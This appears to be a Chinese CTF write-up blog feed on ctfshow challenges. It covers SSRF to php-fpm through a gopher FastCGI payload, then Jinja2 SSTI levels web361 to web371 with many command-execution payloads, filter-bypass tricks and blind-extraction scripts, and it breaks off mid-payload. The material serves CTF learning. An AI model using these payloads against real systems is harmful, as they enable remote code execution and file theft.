CGI，会启动对应的 CGI 程序，对应在这里就是 PHP 的解析器。接下来 PHP 解析器会解析 php.ini 文件，初始化执行环境，然后处理请求，再以规定 CGI 规定的格式返回处理后的结果，退出进程，Web server 再把结果返回给浏览器。这就是一个完整的动态 PHP Web 访问流程<br>这里说的是使用 CGI，而 FastCGI 就相当于高性能的 CGI，与 CGI 不同的是它像一个常驻的 CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次， 所以这里引出下面这句概念，FastCGI 是语言无关的、可伸缩架构的 CGI 开放扩展，其主要行为是将 CGI 解释器进程保持在内存中，并因此获得较高的性能</p></blockquote><blockquote><p>探测是通过gopher协议的延迟判断的<br>gopher:&#x2F;&#x2F;127.0.0.1:9000<br>通过http或其他协议去探测内网，如果ip存活则短延迟(不管端口开没开)，如果ip不存在则长延迟</p></blockquote><p>php-fpm</p><blockquote><p>在静态网站中，WEB 容器如 Apache、Nginx 相当于内容分发员的角色， 根据用户请求的页面从网站根目录中返回给用户；而在动态网站中，WEB 容器例如 Apache 会根据用户的请求进行简单处理后交给 php 解释器；当 Apache 收到用户对 index.php 的请求后，如果使用的是 CGI，会启动对应的 CGI 程序，对应在这里就是 PHP 的解析器。接下来 PHP 解析器会解析 php.ini 文件，初始化执行环境，然后处理请求，再以规定 CGI 规定的格式返回处理后的结果，退出进程，Web server 再把结果返回给浏览器。这就是一个完整的动态 PHP Web 访问流程</p><p>这里说的是使用 CGI，而 FastCGI 就相当于高性能的 CGI，与 CGI 不同的是它像一个常驻的 CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次， 所以这里引出下面这句概念，FastCGI 是语言无关的、可伸缩架构的 CGI 开放扩展，其主要行为是将 CGI 解释器进程保持在内存中，并因此获得较高的性能</p></blockquote><p>假设在配置fpm时，将监听的地址设为了0.0.0.0:9000，那么就会产生php-fpm未授权访问漏洞，此时攻击者可以无需利用SSRF从服务器本地访问的特性，直接与服务器9000端口上的php-fpm进行通信，进而可以用fcgi_exp等工具去攻击服务器上的php-fpm实现任意代码执行<br>还是gopherus这个工具</p><pre class="language-php" data-language="php"><code class="language-php">Give one file name which should be surely present in the server (prefer .php file)if you don&#39;t know press ENTER we have default one:  index.phpTerminal command to run:  cat &#x2F;var&#x2F;www&#x2F;html&#x2F;f* &gt; flag.txt</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694931120245-d9009d25-d5ae-46ed-8b4d-88f63969465b.png" alt="image.png"></p><pre class="language-php" data-language="php"><code class="language-php">gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH83%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00S%04%00%3C%3Fphp%20system%28%27cat%20&#x2F;var&#x2F;www&#x2F;html&#x2F;f%2A%20%3E%20flag.txt%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694932814438-81db3baf-612d-4ee1-a108-834406771f26.png" alt="image.png"></p><h1 id="web310"><a href="#web310" class="headerlink" title="web310"></a>web310</h1><h3 id="SSRF读文件"><a href="#SSRF读文件" class="headerlink" title="SSRF读文件"></a>SSRF读文件</h3><p>admin-admin1<br>伪协议读nginx.conf:</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass config&#123;public $update_url &#x3D; &#39;file:&#x2F;&#x2F;&#x2F;etc&#x2F;nginx&#x2F;nginx.conf&#39;;&#125;class dao&#123;private $config;public function __construct()&#123;$this-&gt;config&#x3D;new config();&#125;&#125;echo base64_encode(serialize(new dao()));# TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyODoiZmlsZTovLy9ldGMvbmdpbngvbmdpbnguY29uZiI7fX0&#x3D;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694932331570-e41b1877-b7a5-4e2f-8362-9700d2a562af.png" alt="image.png">每一个http块都可以包含多个server块，而每个server块就相当于一台虚拟主机，它内部可有多台主机联合提供服务，一起对外提供在逻辑上关系密切的一组服务</p><pre class="language-php" data-language="php"><code class="language-php">server &#123;        listen       4476;        server_name  localhost;        root         &#x2F;var&#x2F;flag;        index index.html;        proxy_set_header Host $host;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;    &#125;</code></pre><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass config&#123;public $update_url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:4476&#39;;&#125;class dao&#123;private $config;public function __construct()&#123;$this-&gt;config&#x3D;new config();&#125;&#125;echo base64_encode(serialize(new dao()));# TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyMToiaHR0cDovLzEyNy4wLjAuMTo0NDc2Ijt9fQ&#x3D;&#x3D;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694932555604-4cbee450-6891-43ef-8b0b-141cacb63afb.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web361-web372SSTI篇</title>
      <link href="/posts/659d759f/"/>
      <url>/posts/659d759f/</url>
      
        <content type="html"><![CDATA[<p>本文中所有{ {、{ %，其余同理中本来应该没有空格，但是由于与Nunjunks语法碰撞，因此修改。</p><blockquote><p><a href="https://blog.csdn.net/q20010619/article/details/120493997">https://blog.csdn.net/q20010619/article/details/120493997</a></p></blockquote><h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690099738699-84cc7144-2cf6-458f-9d0b-4c39ad5e29f5.png" alt="image.png"></h1><p>代码块：</p><pre class="language-python" data-language="python"><code class="language-python">变量块 &#123; &#123;&#125; &#125;用于将表达式打印到模板输出注释块 &#123;##&#125;注释控制块&#123; %% &#125;可以声明变量，也可以执行语句行声明##可以有和&#123; %% &#125;相同的效果</code></pre><p>常用方法：</p><pre class="language-python" data-language="python"><code class="language-python">__class__           查看对象所在的类__mro__             查看继承关系和调用顺序，返回元组__base__            返回基类__bases__           返回基类元组__subclasses__()    返回子类列表__init__            调用初始化函数，可以用来跳到__globals____globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典__builtins__        返回内建内建名称空间字典__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx&#x2F;a.xxx()）都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_appget_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_applipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123; &#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125; &#125;&#123; &#123;cycler.__init__.__globals__.os.popen(&#39;ls&#39;).read()&#125; &#125;current_app          应用上下文，一个全局变量request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;proc\self\fd&#x2F;3&#39;).read()request.args.x1    get传参request.values.x1  所有参数request.cookies      cookies参数request.headers      请求头参数request.form.x1    post传参(Content-Type:applicaation&#x2F;x-www-form-urlencoded或multipart&#x2F;form-data)request.data   post传参(Content-Type:a&#x2F;b)request.json post传json  (Content-Type: application&#x2F;json)config               当前application的所有配置。此外，也可以这样&#123; &#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read() &#125; &#125;</code></pre><p>过滤器：</p><pre class="language-python" data-language="python"><code class="language-python">int()将值转换为int类型；float()将值转换为float类型；lower()将字符串转换为小写；upper()将字符串转换为大写；title()把值中的每个单词的首字母都转成大写；capitalize()把变量值的首字母转成大写，其余字母转小写；trim()截取字符串前面和后面的空白字符；wordcount()计算一个长字符串中单词的个数；reverse()字符串反转；replace(value,old,new)替换将old替换为new的字符串；truncate(value,length&#x3D;255,killwords&#x3D;False)截取length长度的字符串；striptags()删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123; &#123;&#39;&lt;em&gt;hello&lt;&#x2F;em&gt;&#39;|safe&#125; &#125;；list()将变量列成列表；string()将变量转换成字符串；join()将一个序列中的参数值拼接成字符串。示例看上面payload；abs()返回一个数值的绝对值；first()返回一个序列的第一个元素；last()返回一个序列的最后一个元素；format(value,arags,*kwargs)格式化字符串。比如：&#123; &#123;&quot;%s&quot; - &quot;%s&quot;|format(&#39;Hello?&#39;,&quot;Foo!&quot;) &#125; &#125;将输出：Helloo? - Foo!length()返回一个序列或者字典的长度；sum()返回列表内数值的和；sort()返回排序后的列表；default(value,default_value,boolean&#x3D;false)如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean&#x3D;False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean&#x3D;true。也可以使用or来替换。length()返回字符串的长度，别名是count</code></pre><p><strong>注入思路：</strong></p><pre class="language-python" data-language="python"><code class="language-python">1.随便找一个内置类对象用__class__拿到他所对应的类2.用__bases__拿到基类（&lt;class &#39;object&#39;&gt;）3.用__subclasses__()拿到子类列表4.在子类列表中直接寻找可以利用的类getshell对象→类→基本类→子类→__init__方法→__globals__属性→__builtins__属性→eval函数</code></pre><h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><p>名字就是考点，传入name尝试。<br>根据上图，推测可能是twig和Jinja2.<br>直接上payload：<br>可以用Lipsum：</p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;tac &#x2F;flag&#39;).read()&#125; &#125;</code></pre><p>cycler:</p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;cycler.__init__.__globals__.os.popen(&#39;tac &#x2F;flag&#39;).read()&#125; &#125;</code></pre><p>控制块：</p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; % print(url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat ..&#x2F;flag&#39;).read()&quot;))% &#125;</code></pre><p>或者用subclasses一点点扫也行，这里没必要。但这里写一下：<br>土方法：</p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123; %27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;tac ..&#x2F;flag&#39;).read()&#125; &#125;# 这种方法的缺点在于需要找到 类 的索引</code></pre><p>当然也可以直接使用splmap硬扫，指令如下。<br>注意，这个脚本需要使用python2使用，而且后面的指令都没有加上，要注意，如果你想使用该脚本可以按照如 下指令：</p><pre class="language-python" data-language="python"><code class="language-python">python2 .&#x2F;splmap.py -u &#39;目标地址&#39; --os-shell</code></pre><p>注意这里需要到达该文件根目录。<br>然后就自动进入命令行就可以查看文件了。</p><h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;tac &#x2F;flag&#39;).read()&#125; &#125;</code></pre><h1 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h1><h3 id="过滤单双引号"><a href="#过滤单双引号" class="headerlink" title="过滤单双引号"></a>过滤单双引号</h3><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;lipsum.__globals__[request.args.a].popen(request.args.b).read()&#125; &#125;&amp;a&#x3D;os&amp;b&#x3D;tac &#x2F;flag</code></pre><p>除此之外：<br>拼接：</p><pre class="language-python" data-language="python"><code class="language-python">(config.__str__()[2])(config.__str__()[42])?name&#x3D;&#123; &#123;url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]&#125; &#125;等于?name&#x3D;&#123; &#123;url_for.__globals__[&#39;os&#39;]&#125; &#125;</code></pre><p>chr拼接</p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; % set chr&#x3D;url_for.__globals__.__builtins__.chr % &#125;&#123; % print  url_for.__globals__[chr(111)%2bchr(115)]% &#125;</code></pre><p>过滤器拼接：</p><pre class="language-python" data-language="python"><code class="language-python">(()|select|string)[24]</code></pre><h1 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h1><h3 id="过滤args"><a href="#过滤args" class="headerlink" title="过滤args"></a>过滤args</h3><p>可以使用<code>values</code>获取所有参数，来绕过args，当然cookie也行，注意cookie分割是分号</p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;lipsum.__globals__[request.cookies.a].popen(request.cookies.b).read()&#125; &#125;Cookie：a&#x3D;os;b&#x3D;tac &#x2F;flag</code></pre><p>或者</p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;lipsum.__globals__.os.popen(request.values.a).read()&#125; &#125;&amp;a&#x3D;cat &#x2F;flag</code></pre><blockquote><p>相关wp：<a href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p></blockquote><h2 id="字符串变量变量绕过方法"><a href="#字符串变量变量绕过方法" class="headerlink" title="字符串变量变量绕过方法"></a>字符串变量变量绕过方法</h2><blockquote><p><a href="https://blog.csdn.net/q20010619/article/details/120493997">https://blog.csdn.net/q20010619/article/details/120493997</a></p></blockquote><p>拼接：</p><pre class="language-python" data-language="python"><code class="language-python">&quot;cla&quot;+&quot;ss&quot;</code></pre><p>反转：</p><pre class="language-python" data-language="python"><code class="language-python">&quot;__ssalc__&quot;[::-1]</code></pre><p><em>在jinjia2里面，“cla””ss”是等同于”class”的，也就是说我们可以这样引用class，并且绕过字符串过滤</em></p><pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)&quot;&quot;[&quot;__ssalc__&quot;][::-1]&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</code></pre><p>ascii转换</p><pre class="language-python" data-language="python"><code class="language-python">&quot;&#123;0:c&#125;&quot;.format(97)&#x3D;&#39;a&#39;&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)&#x3D;&#39;__class__&#39;</code></pre><p>编码绕过</p><pre class="language-python" data-language="python"><code class="language-python">&quot;__class__&quot;&#x3D;&#x3D;&quot;\x5f\x5fclass\x5f\x5f&quot;&#x3D;&#x3D;&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;对于python2的话，还可以利用base64进行绕过&quot;__class__&quot;&#x3D;&#x3D;(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</code></pre><p>chr函数</p><pre class="language-python" data-language="python"><code class="language-python">&#123; % set chr&#x3D;url_for.__globals__[&#39;__builtins__&#39;].chr % &#125;&#123; &#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125; &#125;</code></pre><p>在jinja2里面可以利用~进行拼接</p><pre class="language-python" data-language="python"><code class="language-python">&#123; %set a&#x3D;&#39;__cla&#39; % &#125;&#123; %set b&#x3D;&#39;ss__&#39;% &#125;&#123; &#123;&quot;&quot;[a~b]&#125; &#125;</code></pre><p>大小写转换</p><pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;[&quot;__CLASS__&quot;.lower()]</code></pre><p>过滤器：</p><pre class="language-python" data-language="python"><code class="language-python">(&#39;__clas&#39;,&#39;s__&#39;)|join[&quot;__CLASS__&quot;|lower&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) &quot;__ssalc__&quot;|reverse&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)(()|select|string)[24]~(()|select|string)[24]~(()|select|string)[15]~(()|select|string)[20]~(()|select|string)[6]~(()|select|string)[18]~(()|select|string)[18]~(()|select|string)[24]~(()|select|string)[24]dict(__clas&#x3D;a,s__&#x3D;b)|join</code></pre><p>获取键值或者下标</p><pre class="language-python" data-language="python"><code class="language-python">dict[&#39;__builtins__&#39;]dict.__getitem__(&#39;__builtins__&#39;)dict.pop(&#39;__builtins__&#39;)dict.get(&#39;__builtins__&#39;)dict.setdefault(&#39;__builtins__&#39;)list[0]list.__getitem__(0)list.pop(0)</code></pre><p>获取属性</p><pre class="language-python" data-language="python"><code class="language-python">().__class__()[&quot;__class__&quot;]()|attr(&quot;__class__&quot;)().__getattribute__(&quot;__class__&quot;)</code></pre><h1 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h1><h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><p>上题的value可以用</p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;lipsum.__globals__.os.popen(request.values.a).read()&#125; &#125;&amp;a&#x3D;cat &#x2F;flag</code></pre><p>cookie也可以</p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;url_for.__globals__.os.popen(request.cookies.c).read()&#125; &#125;Cookie:c&#x3D;cat &#x2F;flag</code></pre><p>常规，用<code>__getitem__()</code>来代替[]<br>直接用<code>__getitem__(1)</code>代替<code>[1]</code><br>或者直接构建任意字符：</p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;config.__str__().__getitem__(22)&#125; &#125;   # 就是22</code></pre><pre class="language-python" data-language="python"><code class="language-python"># anthor:秀儿import requestsurl&#x3D;&quot;http:&#x2F;&#x2F;24d7f73c-6e64-4d9c-95a7-abe78558771a.chall.ctf.show:8080&#x2F;?name&#x3D;&#123; &#123;config.__str__().__getitem__(%d)&#125; &#125;&quot;payload&#x3D;&quot;cat &#x2F;flag&quot;result&#x3D;&quot;&quot;for j in payload:    for i in range(0,1000):        r&#x3D;requests.get(url&#x3D;url%(i))        location&#x3D;r.text.find(&quot;&lt;h3&gt;&quot;)        word&#x3D;r.text[location+4:location+5]        if word&#x3D;&#x3D;j:            print(&quot;config.__str__().__getitem__(%d) &#x3D;&#x3D; %s&quot;%(i,j))            result+&#x3D;&quot;config.__str__().__getitem__(%d)~&quot;%(i)            breakprint(result[:len(result)-1])</code></pre><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;url_for.__globals__.os.popen(config.__str__().__getitem__(22)~config.__str__().__getitem__(40)~config.__str__().__getitem__(23)~config.__str__().__getitem__(7)~config.__str__().__getitem__(279)~config.__str__().__getitem__(4)~config.__str__().__getitem__(41)~config.__str__().__getitem__(40)~config.__str__().__getitem__(6)).read()&#125; &#125;</code></pre><h1 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h1><h3 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h3><p>用过滤器代替：<code>&#123; &#123;XXX|attr(request.args.AAA)|attr(reequest.args.BBB)&#125; &#125;</code><br>values</p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.cmd)|attr(request.values.f)()&#125; &#125;&amp;cmd&#x3D;cat &#x2F;flag&amp;a&#x3D;__globals__&amp;b&#x3D;__getitem__&amp;c&#x3D;os&amp;d&#x3D;popen&amp;f&#x3D;read</code></pre><p>cookie</p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125; &#125;cookie:a&#x3D;__globals__;b&#x3D;cat &#x2F;flag</code></pre><h1 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h1><h2 id="过滤os"><a href="#过滤os" class="headerlink" title="过滤os"></a>过滤os</h2><p>但是也只是name过滤：</p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125; &#125;&amp;a&#x3D;__globals__&amp;b&#x3D;os&amp;c&#x3D;cat &#x2F;flag</code></pre><h1 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h1><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤 { {"></a>过滤 <code>&#123; &#123;</code></h3><p>控制块代替<code>&#123; %</code></p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; %print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() % &#125;&amp;a&#x3D;__globals__&amp;b&#x3D;os&amp;c&#x3D;cat &#x2F;flag</code></pre><p>盲注也可以：<br><code>open(&#39;/flag&#39;).read()</code>是回显整个文件，但是read函数里加上参数：<code>open(&#39;/flag&#39;).read(1)</code>，返回的就是读出所读的文件里的i个字符，以此类推，就可以盲注出了<br>测试payload：</p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123; % set a&#x3D;(lipsum|attr(request.values.a)).get(request.values.b).open(request.values.c).read(1) % &#125; &#125;&#123; &#123; % if a&#x3D;&#x3D;request.values.d % &#125; &#125;H3llo&#123; &#123; % endif % &#125; &#125;&amp;a&#x3D;__globals__&amp;b&#x3D;__builtins__&amp;c&#x3D;&#x2F;flag&amp;d&#x3D;c</code></pre><p>但是在脚本中就不用管两个前括号，但是测试payload里面必须要空。</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SSTI2.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;23 18:01   natro92      1.0        &#123; %% &#125;盲注&quot;&quot;&quot;import stringimport requestsfrom tqdm import trangeurl &#x3D; &#39;http:&#x2F;&#x2F;eee5217c-c792-4517-883f-d6b38c2f5a58.challenge.ctf.show&#x2F;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str &#x3D; &#39;_&#39; + string.printablefor i in trange(9, 100):    for j in str:        params &#x3D; &#123;            &#39;name&#39;: &quot;&#123; &#123; % set a&#x3D;(lipsum|attr(request.values.a)).get(request.values.b).open(request.values.c).read(&#123;&#125;) % &#125; &#125;&#123; &#123; % if a&#x3D;&#x3D;request.values.d % &#125; &#125;H3llo&#123; &#123; % endif % &#125; &#125;&quot;.format(i),            &#39;a&#39;: &quot;__globals__&quot;,            &#39;b&#39;: &quot;__builtins__&quot;,            &#39;c&#39;: &quot;&#x2F;flag&quot;,            &#39;d&#39;: f&#39;&#123;flag_pre + j&#125;&#39;        &#125;        r &#x3D; requests.get(url, params&#x3D;params)        if &#39;H3llo&#39; in r.text:            flag_pre +&#x3D; j            print(flag_pre)            break</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690107790825-13d6d576-602b-4867-8fec-3dbd5b48c04e.png" alt="image.png"></p><h1 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h1><h3 id="过滤request"><a href="#过滤request" class="headerlink" title="过滤request"></a>过滤request</h3><p>直接开拼<br>下划线被 ban，<strong>str</strong>()不能用，需要用 string 过滤器得到 config 字符串：config|string，但是获得字符串后本来应该用中括号或者__getitem__()，但是问题是_被ban了，所以获取字符串中的某个字符比较困难，这里转换成列表，再用列表的pop方法就可以成功得到某个字符了，在跑字符的时候发现没有小写的b，只有大写的B，所以再去一层.lower()方法，方便跑更多字符</p><pre class="language-python" data-language="python"><code class="language-python">import stringimport requestsurl &#x3D; &#39;http:&#x2F;&#x2F;eee5217c-c792-4517-883f-d6b38c2f5a58.challenge.ctf.show&#x2F;?name&#x3D;&#123; &#123; % print (config|string|list).pop(&#123;&#125;).lower() % &#125; &#125;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str &#x3D; &#39;_&#39; + string.printablepayload &#x3D; &#39;tac &#x2F;flag&#39;res &#x3D; &#39;&#39;for j in payload:    for i in range(0,1000):        r&#x3D;requests.get(url&#x3D;url.format(i))        location&#x3D;r.text.find(&quot;&lt;h3&gt;&quot;)        word&#x3D;r.text[location+4:location+5]        if word&#x3D;&#x3D;j.lower():            print(&quot;(config|string|list).pop(%d).lower() &#x3D;&#x3D; %s&quot;%(i,j))            res+&#x3D;&quot;(config|string|list).pop(%d).lower()~&quot;%(i)            break</code></pre><p>payload：</p><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; % print (lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read() % &#125;</code></pre><h2 id="替换字符"><a href="#替换字符" class="headerlink" title="替换字符"></a>替换字符</h2><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; % set a&#x3D;(()|select|string|list).pop(24) % &#125;&#123;   % set globals&#x3D;(a,a,dict(globals&#x3D;1)|join,a,a)|join % &#125;&#123;   % set init&#x3D;(a,a,dict(init&#x3D;1)|join,a,a)|join % &#125;&#123;   % set builtins&#x3D;(a,a,dict(builtins&#x3D;1)|join,a,a)|join % &#125;&#123;   % set a&#x3D;(lipsum|attr(globals)).get(builtins) % &#125;&#123;   % set chr&#x3D;a.chr % &#125;&#123;   % print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() % &#125;</code></pre><p>相当于：</p><pre class="language-python" data-language="python"><code class="language-python">lipsum.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;flag&#39;).read()# 在__builtins__里面拿到chr，同样可以很方便的构造字符</code></pre><h1 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h1><h3 id="过滤数字"><a href="#过滤数字" class="headerlink" title="过滤数字"></a>过滤数字</h3><pre class="language-python" data-language="python"><code class="language-python">&#123; %set num&#x3D;dict(aaaaaaaaaaaaaaaaaaaaaaaa&#x3D;a)|join|count% &#125;&#123; %set numm&#x3D;dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x3D;a)|join|count% &#125;&#123; %set x&#x3D;(()|select|string|list).pop(num)% &#125;&#123; %set glob &#x3D; (x,x,dict(globals&#x3D;a)|join,x,x)|join % &#125;&#123; %set builtins&#x3D;x~x~(dict(builtins&#x3D;a)|join)~x~x% &#125;&#123; %set c &#x3D; dict(chr&#x3D;a)|join% &#125;&#123; %set o &#x3D; dict(o&#x3D;a,s&#x3D;a)|join% &#125;&#123; %set getitem &#x3D; x~x~(dict(getitem&#x3D;a)|join)~x~x% &#125;&#123; %set chr &#x3D; lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)% &#125;&#123; %set file &#x3D; chr(numm)~dict(flag&#x3D;a)|join% &#125;&#123; %print((lipsum|attr(glob)|attr(getitem)(builtins)).open(file).read())% &#125;</code></pre><h1 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h1><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><pre class="language-python" data-language="python"><code class="language-python">&#123; %set e&#x3D;dict(a&#x3D;a)|join|count% &#125;&#123; %set ee&#x3D;dict(aa&#x3D;a)|join|count% 